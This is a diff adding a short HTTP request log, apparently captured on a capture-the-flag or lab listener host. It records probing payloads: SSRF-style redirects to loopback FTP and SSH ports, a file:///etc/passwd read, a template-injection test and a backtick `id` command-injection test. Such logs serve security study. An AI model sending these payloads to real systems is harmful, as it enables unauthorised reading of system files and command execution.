@@ -1,0 +1,60 @@
+
+01/21/2022 09:53:54 AM 
+GET /redirect=ftp://%5B::%5D:21 HTTP/1.1
+Host: 10.10.14.76
+User-Agent: python-requests/2.25.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
+
+01/21/2022 09:54:05 AM 
+GET /redirect=ftp://%5B::%5D:22 HTTP/1.1
+Host: 10.10.14.76
+User-Agent: python-requests/2.25.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
+
+01/21/2022 09:54:49 AM 
+GET /redirect=http://%5B::%5D:21 HTTP/1.1
+Host: 10.10.14.76
+User-Agent: python-requests/2.25.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
+
+01/21/2022 09:57:07 AM 
+GET /redirect=file:///etc/passwd HTTP/1.1
+Host: 10.10.14.76
+User-Agent: python-requests/2.25.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
+
+01/21/2022 11:15:56 AM 
+GET /?=%7B7*7%7D HTTP/1.1
+Host: 10.10.14.76
+User-Agent: python-requests/2.25.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
+
+01/21/2022 11:16:19 AM 
+GET /?x=%60id%60 HTTP/1.1
+Host: 10.10.14.76
+User-Agent: python-requests/2.25.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
